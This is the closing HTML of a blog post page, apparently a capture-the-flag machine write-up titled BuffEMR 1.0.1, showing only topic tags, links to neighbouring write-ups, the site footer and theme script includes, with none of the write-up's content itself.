              <a href="/tags/FTP/" rel="tag"><i class="fa fa-tag"></i> FTP</a>
              <a href="/tags/OpenEMR/" rel="tag"><i class="fa fa-tag"></i> OpenEMR</a>
              <a href="/tags/fcrackzip/" rel="tag"><i class="fa fa-tag"></i> fcrackzip</a>
              <a href="/tags/Command-Injection/" rel="tag"><i class="fa fa-tag"></i> Command Injection</a>
              <a href="/tags/Buffer-Overflow/" rel="tag"><i class="fa fa-tag"></i> Buffer Overflow</a>
              <a href="/tags/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" rel="tag"><i class="fa fa-tag"></i> 缓冲区溢出</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/09/23/Chronos%201/" rel="prev" title="Chronos: 1">
                  <i class="fa fa-angle-left"></i> Chronos: 1
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/09/27/hacksudo%20Thor/" rel="next" title="hacksudo: Thor">
                  hacksudo: Thor <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2020 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">z9m8r8</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">361k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">21:52</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/fancybox.js"></script>

  <script src="/js/third-party/pace.js"></script>


  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>


  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/09/23/BuffEMR%201.0.1/"}</script>
  <script src="/js/third-party/quicklink.js"></script>

</body>
</html>
